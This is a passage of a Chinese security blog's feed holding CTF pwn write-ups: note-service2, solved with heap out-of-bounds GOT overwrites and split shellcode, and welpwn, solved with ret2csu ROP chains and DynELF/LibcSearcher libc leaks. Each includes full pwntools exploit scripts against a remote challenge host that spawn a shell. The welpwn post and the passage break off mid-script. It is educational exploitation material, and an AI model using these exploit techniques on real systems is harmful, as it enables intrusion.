punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>要认识到32位程序和64位程序传参的区别</p></li><li><p>要学会熟练使用DynELF应对可重复泄露的漏洞</p><p>参考博客：<br><a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">【技术分享】借助DynELF实现无libc的漏洞利用小结</a><br><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933&amp;highlight=pwn" target="_blank" rel="noopener">Linux pwn入门教程(5)——利用漏洞获取libc </a></p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆指针越界&amp;堆上布置shellcode|攻防世界pwn进阶区 note-service2</title>
      <link href="/2020/03/21/shellcode/"/>
      <url>/2020/03/21/shellcode/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前CTF竞赛中，以堆为背景的pwn题已逐步成为了pwn类型题目中的主流，开始逐步接触堆题，本题涉及到在堆上布置shellcode，并利用堆指针使程序执行流得到控制。</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><h3 id="0x00-检查保护机制"><a href="#0x00-检查保护机制" class="headerlink" title="0x00.检查保护机制"></a>0x00.检查保护机制</h3><p><img src="https://img-blog.csdnimg.cn/20200318115718392.jpg" alt=""></p><pre><code>Canary found：不能用溢出的方式控制程序执行NX disabled：堆栈上数据可执行PIE enabled：地址随机化开启</code></pre><h3 id="0x01-查看程序功能"><a href="#0x01-查看程序功能" class="headerlink" title="0x01.查看程序功能"></a>0x01.查看程序功能</h3><p><img src="https://img-blog.csdnimg.cn/20200318120153273.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""></p><blockquote><p>一个简单的菜单题，add 和 del可以用，show和edit功能不可用</p></blockquote><h3 id="0x02-ida查看逻辑"><a href="#0x02-ida查看逻辑" class="headerlink" title="0x02.ida查看逻辑"></a>0x02.ida查看逻辑</h3><p><img src="https://img-blog.csdnimg.cn/2020031812100961.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://img-blog.csdnimg.cn/20200318121121612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>获得以下信息：</p><ul><li><strong>堆块最大为8字节，但是我们只能写入7字节的数据</strong></li><li><strong>堆指针的下标可以越界</strong><h3 id="0x03-利用思路"><a href="#0x03-利用思路" class="headerlink" title="0x03.利用思路"></a>0x03.利用思路</h3></li></ul><blockquote><p>（1）通过堆指针越界，把一些GOT表表项替换成堆指针<br>（2）因为NX 关闭，堆栈数据可以执行，直接在堆栈上布置shellcode<br>（3）每个堆块可以写入7个字节的数据，3个字节留作布置jmp short xxx（jmp short占两个字节，对应的机器码是\xeb，xxx对应1字节，且jmp short xxx是相对当前位置寻址），4个字节用于布置shellcode。<br>（4）要把shellcode分开布置在多个堆块上面。</p></blockquote><p>jmp short xxx 中，<strong>xxx=目标地址-当前地址-2</strong></p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="0x00-选一段shellcode布置在堆上"><a href="#0x00-选一段shellcode布置在堆上" class="headerlink" title="0x00.选一段shellcode布置在堆上"></a>0x00.选一段shellcode布置在堆上</h3><pre><code>mov rdi, xxx   //xxx=&amp;("/bin/sh")  xor rsi,rsi   //rsi=0，实际可以是mov rsi, 0 但是mov这个命令太长了。下同。占2字节mov rax, 0x3b //rax=0x3b 占4字节xor rdx,rdx   //rdx=0 占2字节syscall //就是syscall调用execve("/bin/sh",0,0)</code></pre><p><strong>jmp short 占2个字节<br>jmp short xxx占3个字节</strong></p><h3 id="0x01-计算jmp-short指令要跳多少字节"><a href="#0x01-计算jmp-short指令要跳多少字节" class="headerlink" title="0x01.计算jmp short指令要跳多少字节"></a>0x01.计算jmp short指令要跳多少字节</h3><p><img src="https://img-blog.csdnimg.cn/20200318122408317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>从chunk0跳到chunk1，<br>==目标地址-当前地址=8+8+8+1+2=0x1B==<br>==xxx=0x1B-2=0x19==<br>即从当前chunk的jmp区跳到下一个chunk的data区，距离是0x19<br><strong>jmp short 0x19转换成机器码是 \xeb\x19</strong></p><h3 id="0x02-shellcode转换为asm格式"><a href="#0x02-shellcode转换为asm格式" class="headerlink" title="0x02.shellcode转换为asm格式"></a>0x02.shellcode转换为asm格式</h3><pre><code>asm("xor rsi,rsi")+"\x90\x90\xeb\x19"asm("mov rax,0x3b")+"\xeb\x19"asm("xor rdx,rdx")+"\x90\x90\xeb\x19"asm("syscall").ljust(7,"\x90")</code></pre><p><strong>我们无法写出 asm(“mov rdi,&amp;(“/bin/sh”)”)这样的指令</strong>,<strong>即不能把”/bin/sh”的地址直接传给rdi</strong></p><h3 id="0x03-通过64位传参机制把-amp-“-bin-sh”-传到rdi"><a href="#0x03-通过64位传参机制把-amp-“-bin-sh”-传到rdi" class="headerlink" title="0x03.通过64位传参机制把&amp;(“/bin/sh”)传到rdi"></a>0x03.通过64位传参机制把&amp;(“/bin/sh”)传到rdi</h3><p>==由0x02知，我们不能直接把”/bin/sh”的地址给rdi==<br><strong>解决办法：</strong></p><ul><li>申请一个堆块A，把”/bin/sh”写到A上</li><li>调用free函数，把堆块A的内容（即”/bin/sh”地址）当作free函数的参数，因为第一个参数会传到rdi里面去，这样，rdi=&amp;(“/bin/sh”)</li><li>修改free函数的got表，使调用free函数之后的程序流转到我们布置shellcode的堆块上，依次执行shellcode<h3 id="0x04-计算free的got地址和堆数组静态地址的距离"><a href="#0x04-计算free的got地址和堆数组静态地址的距离" class="headerlink" title="0x04.计算free的got地址和堆数组静态地址的距离"></a>0x04.计算free的got地址和堆数组静态地址的距离</h3><img src="https://img-blog.csdnimg.cn/20200318124128459.png" alt=""><br><img src="https://img-blog.csdnimg.cn/20200318125038841.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>数组到free的got表的距离：<code>0x2020A0-0x202018=0x88</code><br><strong>0x88/8=17字节</strong><br><strong>即数组下标减17就来到了free的got表地址</strong></li></ul><h3 id="0x05-尝试写exp："><a href="#0x05-尝试写exp：" class="headerlink" title="0x05. 尝试写exp："></a>0x05. 尝试写exp：</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">48323</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice>>"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"8"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">del</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice>>"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span> <span class="token operator">//</span>申请堆块写入<span class="token string">'/bin/sh'</span>add<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">17</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">"xor rsi,rsi"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x90\x90\xeb\x19"</span><span class="token punctuation">)</span> <span class="token operator">//</span>传入<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>并改写got表add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">"mov eax,0x3b"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\xeb\x19"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">"xor rdx,rdx"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x90\x90\xeb\x19"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">"syscall"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"\x90"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">//</span>系统调用<span class="token keyword">del</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">//</span>这一步我觉得应该是给syscall传参r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>参考blog：</strong><br><a href="https://blog.csdn.net/qq_42728977/article/details/103914342" target="_blank" rel="noopener">攻防世界pwn之note-service</a><br><a href="https://blog.csdn.net/seaaseesa/article/details/103003167" target="_blank" rel="noopener">攻防世界PWN之note-service2题解</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入探究64位rop链构造，wp中常见的万能gadgets详解_ 攻防世界pwn进阶区welpwn</title>
      <link href="/2020/03/21/rop/"/>
      <url>/2020/03/21/rop/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这一题做的时间跨度比较长了，断断续续做了一天多，然后尝试了两种方式，一种是DynELF泄露system地址，还有一种是利用python的LibcSearcher模块得到libc偏移再进一步获取system的libc地址。</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><h3 id="0x00-检查保护机制"><a href="#0x00-检查保护机制" class="headerlink" title="0x00.检查保护机制"></a>0x00.检查保护机制</h3><p><img src="https://img-blog.csdnimg.cn/20200320190823909.jpg" alt=""><br><strong>感觉是栈溢出然后构造ROP来getshell。</strong></p><h3 id="0x01-找到溢出点"><a href="#0x01-找到溢出点" class="headerlink" title="0x01.找到溢出点"></a>0x01.找到溢出点</h3><p><img src="https://img-blog.csdnimg.cn/20200320191121171.jpg" alt=""><br><img src="https://img-blog.csdnimg.cn/20200320191156122.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>read函数是不能溢出的，进echo函数查看，发现echo函数开辟的大小只有0x20，<strong>但是buf可以写入的有0x400字节，buf复制到echo，显然可以发生溢出。</strong><br><strong>利用cyclic计算得出溢出需要24字节。</strong></p><h3 id="0x02-跳过echo在buf上构造rop"><a href="#0x02-跳过echo在buf上构造rop" class="headerlink" title="0x02.跳过echo在buf上构造rop"></a>0x02.跳过echo在buf上构造rop</h3><p>我们可以发现在echo函数内部，有一个循环判断，a1[i]!=’\x00’，否则会发生截断。但是构造rop需要传递地址，一般都会有’\x00’存在，故不能直接构造rop。<br><img src="https://img-blog.csdnimg.cn/20200320191852756.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://img-blog.csdnimg.cn/20200320191908900.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""></p><pre><code>ida查看echo函数的结束地址之后就是read(&amp;buf)的地址。又因为echo开辟的空间是0x20，故echo开始处跳0x20个字节即能到buf处。buf上有0x400大小可以布置ROP。一次rop是8字节，找一个gadget执行四次pop即可。</code></pre><h3 id="0x03-选择合适的gadgets"><a href="#0x03-选择合适的gadgets" class="headerlink" title="0x03.选择合适的gadgets"></a>0x03.选择合适的gadgets</h3><p><img src="https://img-blog.csdnimg.cn/2020032019213157.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""></p><pre class="line-numbers language-yaml"><code class="language-yaml">pop4_addr=0x40089c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x04-万能的通用gadgets"><a href="#0x04-万能的通用gadgets" class="headerlink" title="0x04.万能的通用gadgets"></a>0x04.万能的通用gadgets</h3><blockquote><p>剩下的ROP链可以用通用gadgets来实现。<br>这里涉及到X64下面的一些万能gadgets，原因在于__libc_csu_init()函数。<br>一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</p></blockquote><p><strong>汇编代码如下：</strong></p><pre><code>  400606:   48 8b 5c 24 08          mov    0x8(%rsp),%rbx  40060b:   48 8b 6c 24 10          mov    0x10(%rsp),%rbp  400610:   4c 8b 64 24 18          mov    0x18(%rsp),%r12  400615:   4c 8b 6c 24 20          mov    0x20(%rsp),%r13  40061a:   4c 8b 74 24 28          mov    0x28(%rsp),%r14  40061f:   4c 8b 7c 24 30          mov    0x30(%rsp),%r15</code></pre><pre><code>  4005f0:   4c 89 fa                mov    %r15,%rdx  4005f3:   4c 89 f6                mov    %r14,%rsi  4005f6:   44 89 ef                mov    %r13d,%edi  4005f9:   41 ff 14 dc             callq  *(%r12,%rbx,8)</code></pre><blockquote><p>我们可以看到利用0x400606处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4005f0处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx<em>8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx</em>8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。</p></blockquote><p><strong>call system(“/bin/sh”)</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!bash</span><span class="token comment" spellcheck="true">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span><span class="token comment" spellcheck="true">#system(rdi = bss_addr+8 = "/bin/sh")</span>payload3 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload3 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>参考blog：</strong><a href="http://www.vuln.cn/6644" target="_blank" rel="noopener">蒸米-一步一步学ROP之x64</a><br><strong>实例运用：</strong><a href="https://blog.csdn.net/weixin_43092232/article/details/104906434" target="_blank" rel="noopener">64位程序rop链构造</a></p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="使用DynELF"><a href="#使用DynELF" class="headerlink" title="使用DynELF"></a>使用DynELF</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -.- coding=UTF-8 -.-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">48359</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./welpwn'</span><span class="token punctuation">)</span>pop4_addr <span class="token operator">=</span> <span class="token number">0x40089c</span> <span class="token comment" spellcheck="true">#跳过echo</span>pop6_addr <span class="token operator">=</span> <span class="token number">0x40089a</span> <span class="token comment" spellcheck="true">#pop rbx,rbp,r12,r13,r14,r15;ret;</span>rop2_addr <span class="token operator">=</span> <span class="token number">0x400880</span> <span class="token comment" spellcheck="true">#mov rdx,r15;mov rdi,r14;mov edi,r13;</span>start_addr <span class="token operator">=</span> <span class="token number">0x400630</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x4008a3</span> <span class="token comment" spellcheck="true">#pop rdi;ret</span><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#先接收一次</span>    payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token comment" spellcheck="true">#junk</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop4_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop6_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#通过write函数泄露 pop r14,r15;</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#write(1,address,8)</span>    payload <span class="token operator">+=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">56</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#start调整栈帧</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#回到main函数</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    data <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"%# x => %s "</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span><span class="token punctuation">(</span>data <span class="token operator">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> datadyn <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./welpwn'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> dyn<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'libc'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#写入/bin/sh</span>payload1 <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop4_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop6_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#read(0,bss_addr,8)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2_addr<span class="token punctuation">)</span> payload1 <span class="token operator">+=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">56</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 执行system<span class="token punctuation">(</span><span class="token string">'bss_addr'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> payload1<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#把'/bin/sh'写到bss_addr</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用LibcSearcher"><a href="#使用LibcSearcher" class="headerlink" title="使用LibcSearcher"></a>使用LibcSearcher</h3><p><strong>使用write_addr-libc.dump(‘write’)计算出libc_off地址<br>再由libc_off+libc.dump(‘system’)计算出system_addr</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -.-coding=UTF-8 -.-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">48359</span><span class="token punctuation">)</span>elf <span 